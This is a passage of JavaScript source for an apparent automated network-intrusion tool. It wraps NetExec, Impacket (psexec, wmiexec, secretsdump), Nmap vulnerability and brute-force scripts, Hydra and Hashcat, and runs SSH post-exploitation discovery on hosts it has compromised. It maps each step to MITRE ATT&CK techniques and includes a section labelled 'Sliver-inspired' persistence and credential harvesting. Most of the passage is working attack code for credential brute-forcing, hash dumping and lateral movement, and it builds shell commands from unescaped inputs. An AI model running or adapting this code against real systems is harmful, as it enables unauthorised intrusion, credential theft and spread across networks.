                    exec(`net view \\\\${host} 2>&1`, { timeout: 10000 }, (err2, shares) => {
                        exec(`net use \\\\${host}\\IPC$ /delete /y 2>&1`, { timeout: 5000 }, () => {});
                        callback({ success: true, method: 'SMB', host, username, shares: shares || '', info: 'SMB authentication successful' });
                    });
                } else {
                    callback({ success: false, method: 'SMB', error: 'SMB authentication failed', info: stdout });
                }
            });
        } else {
            // Linux: try smbclient, then rpcclient
            exec(`which smbclient 2>/dev/null`, { timeout: 2000 }, (err) => {
                if (!err) {
                    const escapedPass = password.replace(/'/g, "'\\''");
                    exec(`smbclient -L //${host} -U '${username}%${escapedPass}' -t 5 2>&1`, { timeout: 15000 }, (error, stdout) => {
                        const success = stdout && (stdout.includes('Sharename') || stdout.includes('Disk') || stdout.includes('IPC'));
                        callback({
                            success, method: 'SMB', host, username,
                            shares: success ? stdout : '',
                            info: success ? 'SMB shares enumerated' : 'SMB auth failed'
                        });
                    });
                } else {
                    // Try rpcclient
                    exec(`which rpcclient 2>/dev/null`, { timeout: 2000 }, (err2) => {
                        if (!err2) {
                            const escapedPass = password.replace(/'/g, "'\\''");
                            exec(`rpcclient -U '${username}%${escapedPass}' ${host} -c 'srvinfo' 2>&1`, { timeout: 10000 }, (error, stdout) => {
                                const success = stdout && !stdout.includes('NT_STATUS');
                                callback({ success, method: 'SMB-RPC', host, username, info: success ? stdout.trim() : 'RPC auth failed' });
                            });
                        } else {
                            callback({ success: false, method: 'SMB', error: 'SMB open but no smbclient/rpcclient available' });
                        }
                    });
                }
            });
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'SMB', error: 'Connection timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'SMB', error: err.message }); });
    socket.connect(445, host);
}

// Enhanced post-exploitation data collection
function collectPostExploitData(host, method, callback) {
    const isWin = process.platform === 'win32';
    const results = { host, hostname: '', os: 'Unknown', info: '', services: [], users: '' };

    // Reverse DNS lookup
    const dnsCmd = isWin ? `nslookup ${host}` : `host ${host}`;
    exec(`${dnsCmd} 2>&1`, { timeout: 5000 }, (err, stdout) => {
        if (stdout) {
            const match = stdout.match(/name\s*[=:]\s*(\S+)/i) || stdout.match(/pointer\s+(\S+)/i) || stdout.match(/Name:\s+(\S+)/i);
            if (match) results.hostname = match[1].replace(/\.$/, '');
        }

        // OS detection
        results.os = method && method.includes('SSH') ? 'Linux/Unix' : method && method.includes('SMB') ? 'Windows' : 'Unknown';

        // Try ARP for MAC address
        const arpCmd = isWin ? `arp -a ${host}` : `arp -n ${host}`;
        exec(`${arpCmd} 2>&1`, { timeout: 3000 }, (arpErr, arpOut) => {
            let mac = '';
            if (arpOut) {
                const macMatch = arpOut.match(/([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/);
                if (macMatch) mac = macMatch[0];
            }

            results.info = `Hostname: ${results.hostname || 'unknown'}, MAC: ${mac || 'unknown'}, Access: ${method || 'unknown'}`;
            callback(results);
        });
    });
}

// ===== INTEGRATED TOOLS DETECTION =====
const toolCache = {};

function checkTool(toolName, callback) {
    if (toolCache[toolName] !== undefined) {
        callback(toolCache[toolName]);
        return;
    }
    const isWin = process.platform === 'win32';
    const cmd = isWin ? `where ${toolName} 2>nul` : `which ${toolName} 2>/dev/null`;
    exec(cmd, { timeout: 3000 }, (err, stdout) => {
        toolCache[toolName] = !err && stdout.trim().length > 0 ? stdout.trim() : null;
        callback(toolCache[toolName]);
    });
}

function checkPythonTool(toolName, callback) {
    if (toolCache[toolName] !== undefined) {
        callback(toolCache[toolName]);
        return;
    }
    exec(`python3 -c "import ${toolName}" 2>/dev/null || python -c "import ${toolName}" 2>/dev/null`, { timeout: 3000 }, (err) => {
        toolCache[toolName] = !err;
        callback(!err);
    });
}

// ===== NETEXEC (nxc) INTEGRATION =====
// NetExec is the successor to CrackMapExec - the most powerful network exploitation tool
// Supports: SMB, SSH, WinRM, RDP, LDAP, MSSQL, FTP, VNC

function nxcExploit(host, protocol, username, password, callback) {
    checkTool('nxc', (nxcPath) => {
        if (!nxcPath) {
            checkTool('netexec', (nePath) => {
                if (!nePath) {
                    checkTool('crackmapexec', (cmePath) => {
                        if (!cmePath) {
                            callback({ success: false, method: `NetExec-${protocol}`, error: 'NetExec/CrackMapExec not installed', toolMissing: true });
                            return;
                        }
                        runNxcCommand(cmePath, host, protocol, username, password, callback);
                    });
                    return;
                }
                runNxcCommand(nePath, host, protocol, username, password, callback);
            });
            return;
        }
        runNxcCommand(nxcPath, host, protocol, username, password, callback);
    });
}

function runNxcCommand(nxcBin, host, protocol, username, password, callback) {
    const passArg = password ? `-p '${password.replace(/'/g, "\\'")}'` : `-p ''`;
    const cmd = `${nxcBin} ${protocol} ${host} -u '${username}' ${passArg} --timeout 10 2>&1`;
    exec(cmd, { timeout: 30000 }, (error, stdout) => {
        const output = stdout || '';
        const success = output.includes('[+]') || output.includes('Pwn3d!');
        const admin = output.includes('Pwn3d!') || output.includes('(admin)') || output.includes('STATUS_SUCCESS');

        if (success) {
            // Try to get more info
            const infoCmd = protocol === 'smb' ?
                `${nxcBin} smb ${host} -u '${username}' ${passArg} --shares --users --sessions 2>&1` :
                protocol === 'ssh' ?
                    `${nxcBin} ssh ${host} -u '${username}' ${passArg} -x 'id && uname -a && hostname' 2>&1` :
                    protocol === 'winrm' ?
                        `${nxcBin} winrm ${host} -u '${username}' ${passArg} -x 'whoami && systeminfo' 2>&1` :
                        protocol === 'mssql' ?
                            `${nxcBin} mssql ${host} -u '${username}' ${passArg} -q 'SELECT @@version' 2>&1` :
                            null;

            if (infoCmd) {
                exec(infoCmd, { timeout: 20000 }, (e2, info) => {
                    callback({
                        success: true, method: `NetExec-${protocol.toUpperCase()}`, host, username,
                        admin, info: `${protocol.toUpperCase()} access gained${admin ? ' (ADMIN)' : ''}`,
                        sysInfo: (info || output).substring(0, 1000)
                    });
                });
            } else {
                callback({
                    success: true, method: `NetExec-${protocol.toUpperCase()}`, host, username,
                    admin, info: `${protocol.toUpperCase()} access gained${admin ? ' (ADMIN)' : ''}`,
                    sysInfo: output.substring(0, 500)
                });
            }
        } else {
            callback({ success: false, method: `NetExec-${protocol.toUpperCase()}`, host, username, info: output.substring(0, 200) });
        }
    });
}

// Multi-protocol NetExec exploitation
function nxcFullExploit(host, openPorts, credentials, callback) {
    const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
    const protocols = [];
    if (portSet.has(445) || portSet.has(139)) protocols.push('smb');
    if (portSet.has(22)) protocols.push('ssh');
    if (portSet.has(5985) || portSet.has(5986)) protocols.push('winrm');
    if (portSet.has(3389)) protocols.push('rdp');
    if (portSet.has(1433)) protocols.push('mssql');
    if (portSet.has(21)) protocols.push('ftp');
    if (portSet.has(389) || portSet.has(636)) protocols.push('ldap');

    if (protocols.length === 0) {
        callback({ success: false, method: 'NetExec', info: 'No supported NetExec protocols' });
        return;
    }

    let pending = 0;
    const results = [];
    let found = false;

    for (const proto of protocols) {
        for (const cred of credentials) {
            if (found) break;
            pending++;
            nxcExploit(host, proto, cred.username, cred.password, (r) => {
                results.push(r);
                if (r.success && !found) found = true;
                pending--;
                if (pending <= 0 || found) {
                    const best = results.find(r2 => r2.success);
                    callback(best || { success: false, method: 'NetExec', allResults: results, info: `NetExec: ${results.length} attempts failed` });
                }
            });
        }
        if (found) break;
    }

    if (pending === 0) {
        callback({ success: false, method: 'NetExec', info: 'No attempts made' });
    }
}

// ===== IMPACKET INTEGRATION =====
// Impacket provides psexec, smbexec, wmiexec, secretsdump, etc.

function impacketExploit(host, username, password, tool, callback) {
    const toolMap = {
        psexec: 'impacket-psexec',
        smbexec: 'impacket-smbexec',
        wmiexec: 'impacket-wmiexec',
        atexec: 'impacket-atexec',
        dcomexec: 'impacket-dcomexec',
        secretsdump: 'impacket-secretsdump'
    };

    const toolBin = toolMap[tool] || `impacket-${tool}`;
    const altBin = `${tool}.py`;

    checkTool(toolBin, (toolPath) => {
        const binToUse = toolPath || null;
        if (!binToUse) {
            checkTool(altBin, (altPath) => {
                if (!altPath) {
                    callback({ success: false, method: `Impacket-${tool}`, error: `${toolBin} not installed`, toolMissing: true });
                    return;
                }
                runImpacketCommand(altPath, host, username, password, tool, callback);
            });
            return;
        }
        runImpacketCommand(binToUse, host, username, password, tool, callback);
    });
}

function runImpacketCommand(binPath, host, username, password, tool, callback) {
    const escapedPass = password.replace(/'/g, "\\'");
    let cmd;

    if (tool === 'secretsdump') {
        cmd = `${binPath} '${username}':'${escapedPass}'@${host} 2>&1`;
    } else {
        const execCmd = tool === 'psexec' || tool === 'smbexec' || tool === 'wmiexec' ?
            `'echo MONKEY_IMPLANT_SUCCESS && whoami && systeminfo /FO CSV 2>nul || uname -a 2>/dev/null'` :
            `'echo MONKEY_IMPLANT_SUCCESS && whoami'`;
        cmd = `${binPath} '${username}':'${escapedPass}'@${host} ${execCmd} 2>&1`;
    }

    exec(cmd, { timeout: 30000 }, (error, stdout) => {
        const output = stdout || '';
        const success = output.includes('MONKEY_IMPLANT_SUCCESS') ||
            (tool === 'secretsdump' && (output.includes('SAM hashes') || output.includes('NTLM') || output.includes(':::') || output.includes('Administrator')));

        callback({
            success, method: `Impacket-${tool}`, host, username,
            admin: success,
            info: success ? `${tool} remote execution successful` : `${tool} failed`,
            sysInfo: success ? output.substring(0, 1000) : null
        });
    });
}

function impacketFullExploit(host, credentials, callback) {
    const tools = ['psexec', 'smbexec', 'wmiexec', 'atexec', 'secretsdump'];
    let pending = 0;
    const results = [];
    let found = false;

    for (const tool of tools) {
        for (const cred of credentials.slice(0, 5)) {
            if (found) break;
            pending++;
            impacketExploit(host, cred.username, cred.password, tool, (r) => {
                results.push(r);
                if (r.success && !found) found = true;
                pending--;
                if (pending <= 0 || found) {
                    const best = results.find(r2 => r2.success);
                    callback(best || { success: false, method: 'Impacket', allResults: results, info: `Impacket: ${results.length} attempts failed` });
                }
            });
        }
        if (found) break;
    }

    if (pending === 0) {
        callback({ success: false, method: 'Impacket', info: 'No Impacket tools available' });
    }
}

// ===== NMAP NSE INTEGRATION =====
// Nmap with NSE scripts for advanced vulnerability scanning

function nmapVulnScan(host, ports, callback) {
    checkTool('nmap', (nmapPath) => {
        if (!nmapPath) {
            callback({ success: false, error: 'Nmap not installed', toolMissing: true, vulns: [] });
            return;
        }

        const portStr = ports.map(p => typeof p === 'number' ? p : p.port).join(',');
        const scripts = [
            'vuln', 'exploit', 'auth', 'default',
            'smb-vuln-ms17-010', 'smb-vuln-ms08-067',
            'ssh-auth-methods', 'ftp-anon', 'ftp-vsftpd-backdoor',
            'http-vuln-cve2017-5638', 'mysql-empty-password',
            'redis-info', 'mongodb-info'
        ].join(',');

        const cmd = `${nmapPath} -sV -sC --script=${scripts} -p ${portStr} ${host} -oN - --open 2>&1`;

        exec(cmd, { timeout: 120000 }, (error, stdout) => {
            const output = stdout || '';
            const vulns = [];

            // Parse vulnerability results
            const vulnMatches = output.match(/VULNERABLE[\s\S]*?(?=\n\n|\n[A-Z]|$)/g);
            if (vulnMatches) {
                vulnMatches.forEach(v => {
                    const titleMatch = v.match(/\|([^|]+):/);
                    vulns.push({
                        name: titleMatch ? titleMatch[1].trim() : 'Unknown Vulnerability',
                        details: v.substring(0, 300)
                    });
                });
            }

            // Check for specific findings
            if (output.includes('Anonymous FTP login allowed')) vulns.push({ name: 'FTP Anonymous Access', details: 'Anonymous FTP login allowed' });
            if (output.includes('ms17-010') || output.includes('VULNERABLE')) vulns.push({ name: 'MS17-010 (EternalBlue)', details: 'SMB vulnerability detected' });
            if (output.includes('ms08-067')) vulns.push({ name: 'MS08-067 (Conficker)', details: 'SMB vulnerability detected' });
            if (output.includes('empty-password') || output.includes('root.*EMPTY')) vulns.push({ name: 'Empty Password', details: 'Service accepts empty password' });
            if (output.includes('vsftpd')) vulns.push({ name: 'vsFTPd Backdoor', details: 'vsFTPd backdoor vulnerability' });

            // Parse service versions
            const services = [];
            const svcMatches = output.match(/(\d+)\/tcp\s+open\s+(\S+)\s+(.*)/g);
            if (svcMatches) {
                svcMatches.forEach(s => {
                    const parts = s.match(/(\d+)\/tcp\s+open\s+(\S+)\s+(.*)/);
                    if (parts) services.push({ port: parseInt(parts[1]), service: parts[2], version: parts[3].trim() });
                });
            }

            callback({
                success: true, host,
                vulns, services,
                rawOutput: output.substring(0, 2000),
                info: `Nmap found ${vulns.length} vulnerabilities, ${services.length} services`
            });
        });
    });
}

// Nmap brute-force scripts
function nmapBrute(host, port, service, callback) {
    checkTool('nmap', (nmapPath) => {
        if (!nmapPath) {
            callback({ success: false, error: 'Nmap not installed', toolMissing: true });
            return;
        }

        const scriptMap = {
            ssh: 'ssh-brute',
            ftp: 'ftp-brute',
            telnet: 'telnet-brute',
            mysql: 'mysql-brute',
            mssql: 'ms-sql-brute',
            postgresql: 'pgsql-brute',
            smb: 'smb-brute',
            vnc: 'vnc-brute',
            http: 'http-brute',
            rdp: 'rdp-brute'
        };

        const script = scriptMap[service] || `${service}-brute`;
        const cmd = `${nmapPath} --script=${script} -p ${port} ${host} 2>&1`;

        exec(cmd, { timeout: 60000 }, (error, stdout) => {
            const output = stdout || '';
            const success = output.includes('Valid credentials') || output.includes('Account:') || output.includes('login:');

            let username = null;
            let password = null;
            const credMatch = output.match(/(?:Account|login):\s*(\S+)\s*-\s*(?:Password|password):\s*(\S+)/i) ||
                output.match(/Valid credentials:\s*(\S+)\s*:\s*(\S+)/i);
            if (credMatch) {
                username = credMatch[1];
                password = credMatch[2];
            }

            callback({
                success, method: `Nmap-${service}-brute`, host,
                username, password,
                info: success ? `Nmap brute-force found credentials: ${username}:${password}` : 'Nmap brute-force failed',
                sysInfo: output.substring(0, 500)
            });
        });
    });
}

// ===== Hydra INTEGRATION =====
// THC Hydra - fast network brute-forcer

function hydraExploit(host, port, service, username, password, callback) {
    checkTool('hydra', (hydraPath) => {
        if (!hydraPath) {
            callback({ success: false, method: `Hydra-${service}`, error: 'Hydra not installed', toolMissing: true });
            return;
        }

        const escapedPass = password.replace(/'/g, "\\'");
        const cmd = `${hydraPath} -l '${username}' -p '${escapedPass}' ${host} ${service} -s ${port} -t 4 -f 2>&1`;

        exec(cmd, { timeout: 30000 }, (error, stdout) => {
            const output = stdout || '';
            const success = output.includes('[' + port + ']') && (output.includes('login:') || output.includes('host:'));

            callback({
                success, method: `Hydra-${service}`, host, username,
                info: success ? `Hydra ${service} brute-force successful` : `Hydra ${service} failed`,
                sysInfo: success ? output.substring(0, 500) : null
            });
        });
    });
}

// Hydra multi-credential brute-force
function hydraBrute(host, port, service, credentials, callback) {
    checkTool('hydra', (hydraPath) => {
        if (!hydraPath) {
            callback({ success: false, method: `Hydra-${service}`, error: 'Hydra not installed', toolMissing: true });
            return;
        }

        // Create temp user/pass lists
        const tmpDir = path.join(app.getPath('userData'), 'tmp');
        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

        const userFile = path.join(tmpDir, 'users.txt');
        const passFile = path.join(tmpDir, 'passwords.txt');

        const users = [...new Set(credentials.map(c => c.username))];
        const passwords = [...new Set(credentials.map(c => c.password))];

        fs.writeFileSync(userFile, users.join('\n'));
        fs.writeFileSync(passFile, passwords.join('\n'));

        const cmd = `${hydraPath} -L '${userFile}' -P '${passFile}' ${host} ${service} -s ${port} -t 4 -f 2>&1`;

        exec(cmd, { timeout: 120000 }, (error, stdout) => {
            const output = stdout || '';
            const success = output.includes('login:') || output.includes('host:');

            let foundUser = null;
            let foundPass = null;
            const credMatch = output.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);
            if (credMatch) {
                foundUser = credMatch[1];
                foundPass = credMatch[2];
            }

            // Clean up temp files
            try { fs.unlinkSync(userFile); fs.unlinkSync(passFile); } catch {}

            callback({
                success, method: `Hydra-${service}`, host,
                username: foundUser, password: foundPass,
                info: success ? `Hydra found creds: ${foundUser}:${foundPass}` : 'Hydra brute-force failed',
                sysInfo: success ? output.substring(0, 500) : null
            });
        });
    });
}

// ===== MITRE ATT&CK TECHNIQUE LIBRARY (Inspired by MITRE Caldera v5) =====
const ATTACK_TECHNIQUES = {
    reconnaissance: [
        { id: 'T1595', name: 'Active Scanning', subtechniques: ['T1595.001', 'T1595.002', 'T1595.003'] },
        { id: 'T1592', name: 'Gather Victim Host Information' },
        { id: 'T1590', name: 'Gather Victim Network Information' },
        { id: 'T1589', name: 'Gather Victim Identity Information' }
    ],
    discovery: [
        { id: 'T1046', name: 'Network Service Discovery' },
        { id: 'T1135', name: 'Network Share Discovery' },
        { id: 'T1040', name: 'Network Sniffing' },
        { id: 'T1018', name: 'Remote System Discovery' },
        { id: 'T1082', name: 'System Information Discovery' },
        { id: 'T1016', name: 'System Network Configuration Discovery' },
        { id: 'T1049', name: 'System Network Connections Discovery' },
        { id: 'T1033', name: 'System Owner/User Discovery' },
        { id: 'T1007', name: 'System Service Discovery' },
        { id: 'T1124', name: 'System Time Discovery' },
        { id: 'T1069', name: 'Permission Groups Discovery' },
        { id: 'T1057', name: 'Process Discovery' },
        { id: 'T1012', name: 'Query Registry' },
        { id: 'T1518', name: 'Software Discovery' }
    ],
    credential_access: [
        { id: 'T1110', name: 'Brute Force', subtechniques: ['T1110.001', 'T1110.002', 'T1110.003', 'T1110.004'] },
        { id: 'T1003', name: 'OS Credential Dumping' },
        { id: 'T1552', name: 'Unsecured Credentials' },
        { id: 'T1078', name: 'Valid Accounts' }
    ],
    lateral_movement: [
        { id: 'T1021', name: 'Remote Services', subtechniques: ['T1021.001', 'T1021.002', 'T1021.004', 'T1021.006'] },
        { id: 'T1570', name: 'Lateral Tool Transfer' },
        { id: 'T1072', name: 'Software Deployment Tools' }
    ],
    execution: [
        { id: 'T1059', name: 'Command and Scripting Interpreter' },
        { id: 'T1047', name: 'Windows Management Instrumentation' },
        { id: 'T1569', name: 'System Services' }
    ],
    collection: [
        { id: 'T1005', name: 'Data from Local System' },
        { id: 'T1039', name: 'Data from Network Shared Drive' },
        { id: 'T1074', name: 'Data Staged' }
    ],
    exfiltration: [
        { id: 'T1041', name: 'Exfiltration Over C2 Channel' },
        { id: 'T1048', name: 'Exfiltration Over Alternative Protocol' }
    ]
};

// Caldera-style ability execution: system discovery techniques
function executeDiscoveryAbilities(host, method, credentials, callback) {
    const isWin = process.platform === 'win32';
    const results = { host, techniques: [], systemInfo: {} };
    let pending = 0;

    function done() {
        pending--;
        if (pending <= 0) callback(results);
    }

    // T1082: System Information Discovery
    pending++;
    if (method === 'SSH' && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "uname -a && cat /etc/os-release 2>/dev/null && free -h 2>/dev/null && df -h 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
            if (stdout && !stdout.includes('Permission denied')) {
                results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: true, data: stdout.substring(0, 500) });
                results.systemInfo.os = stdout;
            }
            done();
        });
    } else {
        results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: false });
        done();
    }

    // T1016: System Network Configuration Discovery
    pending++;
    if (method === 'SSH' && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "ip addr 2>/dev/null || ifconfig 2>/dev/null && ip route 2>/dev/null || route -n 2>/dev/null && cat /etc/resolv.conf 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
            if (stdout && !stdout.includes('Permission denied')) {
                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: true, data: stdout.substring(0, 500) });
                results.systemInfo.network = stdout;
            } else {
                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: false });
            }
            done();
        });
    } else {
        results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: false });
        done();
    }

    // T1033: System Owner/User Discovery
    pending++;
    if (method === 'SSH' && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "whoami && id && w && last -5 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
            if (stdout && !stdout.includes('Permission denied')) {
                results.techniques.push({ id: 'T1033', name: 'System Owner/User Discovery', success: true, data: stdout.substring(0, 500) });
                results.systemInfo.users = stdout;
            }
            done();
        });
    } else {
        results.techniques.push({ id: 'T1033', name: 'System Owner/User Discovery', success: false });
        done();
    }

    // T1057: Process Discovery
    pending++;
    if (method === 'SSH' && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "ps aux --sort=-%mem 2>/dev/null | head -20" 2>&1`, { timeout: 15000 }, (err, stdout) => {
            if (stdout && !stdout.includes('Permission denied')) {
                results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: true, data: stdout.substring(0, 500) });
                results.systemInfo.processes = stdout;
            }
            done();
        });
    } else {
        results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: false });
        done();
    }

    // T1018: Remote System Discovery (scan neighbors from exploited host)
    pending++;
    if (method === 'SSH' && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "arp -a 2>/dev/null && cat /proc/net/arp 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
            if (stdout && !stdout.includes('Permission denied')) {
                results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: true, data: stdout.substring(0, 500) });
                results.systemInfo.neighbors = stdout;
            }
            done();
        });
    } else {
        results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: false });
        done();
    }

    // T1135: Network Share Discovery
    pending++;
    if (method && method.includes('SMB') && credentials) {
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        if (isWin) {
            exec(`net view \\\\${host} 2>&1`, { timeout: 10000 }, (err, stdout) => {
                results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success: !err, data: (stdout || '').substring(0, 500) });
                done();
            });
        } else {
            exec(`smbclient -L //${host} -U '${credentials.username}%${escapedPass}' -t 5 2>&1`, { timeout: 15000 }, (err, stdout) => {
                const success = stdout && (stdout.includes('Sharename') || stdout.includes('Disk'));
                results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success, data: (stdout || '').substring(0, 500) });
                done();
            });
        }
    } else {
        results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success: false });
        done();
    }
}

// Map our exploit methods to ATT&CK technique IDs
function mapExploitToATTACK(method) {
    const mapping = {
        'SSH': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021.004', 'T1110.001'] },
        'SMB': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021.002', 'T1110.001'] },
        'FTP': { tactics: ['credential_access', 'lateral_movement'], techniques: ['T1110.001', 'T1078'] },
        'Telnet': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021', 'T1110.001'] },
        'Redis-NoAuth': { tactics: ['credential_access'], techniques: ['T1552', 'T1078'] },
        'MongoDB-NoAuth': { tactics: ['credential_access', 'collection'], techniques: ['T1552', 'T1005'] },
        'VNC-NoAuth': { tactics: ['lateral_movement'], techniques: ['T1021.005'] },
        'MySQL': { tactics: ['credential_access'], techniques: ['T1110.001'] },
        'PostgreSQL': { tactics: ['credential_access'], techniques: ['T1110.001'] },
        'NetExec-SMB': { tactics: ['lateral_movement', 'credential_access', 'execution'], techniques: ['T1021.002', 'T1110', 'T1047'] },
        'NetExec-SSH': { tactics: ['lateral_movement'], techniques: ['T1021.004'] },
        'NetExec-WINRM': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.006', 'T1059'] },
        'NetExec-RDP': { tactics: ['lateral_movement'], techniques: ['T1021.001'] },
        'NetExec-MSSQL': { tactics: ['credential_access', 'execution'], techniques: ['T1110', 'T1059'] },
        'Impacket-psexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1569'] },
        'Impacket-smbexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1059'] },
        'Impacket-wmiexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1047'] },
        'Impacket-secretsdump': { tactics: ['credential_access'], techniques: ['T1003'] },
        'Hydra-ssh': { tactics: ['credential_access'], techniques: ['T1110.001'] },
        'Hydra-ftp': { tactics: ['credential_access'], techniques: ['T1110.001'] },
        'Hydra-smb': { tactics: ['credential_access'], techniques: ['T1110.001'] },
        'Nmap-VulnScan': { tactics: ['reconnaissance'], techniques: ['T1595.002'] }
    };
    return mapping[method] || { tactics: ['unknown'], techniques: [] };
}

// ===== THC HYDRA INTEGRATION (Open Source Network Brute-Force Tool) =====
// Hydra v9.6 - World's most popular online password brute-force tool
// Supports: SSH, FTP, SMB, Telnet, HTTP, MySQL, PostgreSQL, VNC, RDP, RTSP, SNMP, and 50+ protocols
// Source: https://github.com/vanhauser-thc/thc-hydra (12K+ stars, MIT License)

function detectHydra(callback) {
    const isWin = process.platform === 'win32';
    const cmd = isWin ? 'where hydra 2>nul' : 'which hydra 2>/dev/null';
    exec(cmd, { timeout: 5000 }, (err, stdout) => {
        callback(!!stdout && stdout.trim().length > 0, stdout ? stdout.trim() : null);
    });
}

function runHydra(host, port, service, userList, passList, options, callback) {
    detectHydra((found, hydraPath) => {
        if (!found) {
            callback({ success: false, error: 'Hydra not installed', fallback: true });
            return;
        }
        const isWin = process.platform === 'win32';
        const tmpDir = isWin ? process.env.TEMP || 'C:\\Temp' : '/tmp';
        const userFile = path.join(tmpDir, `hydra_users_${Date.now()}.txt`);
        const passFile = path.join(tmpDir, `hydra_pass_${Date.now()}.txt`);

        fs.writeFileSync(userFile, userList.join('\n'));
        fs.writeFileSync(passFile, passList.join('\n'));

        const tasks = options.tasks || 16;
        const timeout = options.timeout || 30;
        const hydraService = service === 'http' ? 'http-get' : service;
        let cmd = `hydra -L "${userFile}" -P "${passFile}" -t ${tasks} -w ${timeout} -f -o /dev/stdout ${host}`;
        if (port) cmd += ` -s ${port}`;
        cmd += ` ${hydraService}`;
        if (options.extraArgs) cmd += ` ${options.extraArgs}`;

        const results = { success: false, attempts: [], found: [] };
        exec(cmd, { timeout: 300000, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
            // Clean temp files
            try { fs.unlinkSync(userFile); } catch(e) {}
            try { fs.unlinkSync(passFile); } catch(e) {}

            if (stdout) {
                const lines = stdout.split('\n');
                for (const line of lines) {
                    const match = line.match(/\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S*)/);
                    if (match) {
                        results.found.push({
                            port: match[1], service: match[2], host: match[3],
                            username: match[4], password: match[5]
                        });
                        results.success = true;
                    }
                }
            }
            results.raw = (stdout || '').substring(0, 2000);
            callback(results);
        });
    });
}

// ===== HASHCAT INTEGRATION (GPU Password Cracking) =====
// Hashcat v7.x - World's fastest password recovery utility
// Supports: 450+ hash types, GPU acceleration via OpenCL/CUDA
// Source: https://github.com/hashcat/hashcat (26K+ stars, MIT License)

function detectHashcat(callback) {
    const isWin = process.platform === 'win32';
    const cmd = isWin ? 'where hashcat 2>nul' : 'which hashcat 2>/dev/null';
    exec(cmd, { timeout: 5000 }, (err, stdout) => {
        if (stdout && stdout.trim()) {
            exec('hashcat --version 2>/dev/null', { timeout: 5000 }, (err2, ver) => {
                callback(true, stdout.trim(), ver ? ver.trim() : 'unknown');
            });
        } else {
            callback(false, null, null);
        }
    });
}

function runHashcat(hashFile, hashType, wordlist, options, callback) {
    detectHashcat((found, hashcatPath) => {
        if (!found) {
            callback({ success: false, error: 'Hashcat not installed', fallback: true });
            return;
        }
        const device = options.gpuOnly ? '-D 2' : '';
        const rules = options.rules ? `-r ${options.rules}` : '';
        const outFile = `/tmp/hashcat_out_${Date.now()}.txt`;
        let cmd = `hashcat -m ${hashType} -a 0 ${device} ${rules} --potfile-disable -o "${outFile}" "${hashFile}" "${wordlist}"`;
        if (options.force) cmd += ' --force';

        exec(cmd, { timeout: 600000, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
            let crackedPasswords = [];
            try {
                const output = fs.readFileSync(outFile, 'utf8');
                crackedPasswords = output.split('\n').filter(l => l.trim()).map(l => {
                    const parts = l.split(':');
                    return { hash: parts[0], password: parts.slice(1).join(':') };
                });
            } catch(e) {}
            try { fs.unlinkSync(outFile); } catch(e) {}

            callback({
                success: crackedPasswords.length > 0,
                cracked: crackedPasswords,
                total: crackedPasswords.length,
                raw: (stdout || '').substring(0, 2000)
            });
        });
    });
}

// ===== SLIVER-INSPIRED POST-EXPLOITATION AGENT =====
// Enhanced with capabilities from Sliver C2 Framework (BishopFox, 11K+ stars, GPL-3.0)
// Source: https://github.com/BishopFox/sliver
// Implements: System enumeration, process discovery, persistence mechanisms,
// lateral movement preparation, credential harvesting, network pivoting

function sliverInspiredAgent(host, method, credentials, callback) {
    const results = {
        host, phase: 'sliver-enhanced-post-exploit',
        systemInfo: {}, processes: [], persistence: [],
        lateralTargets: [], credentialsFound: [], pivotPoints: [],
        networkMap: [], techniques: []
    };
    const isWin = process.platform === 'win32';
    let pending = 0;

    function done() {
        pending--;
        if (pending <= 0) callback(results);
    }

    function sshExec(command, cb) {
        if (!credentials || !credentials.username) { cb('', false); return; }
        const sshCmd = isWin
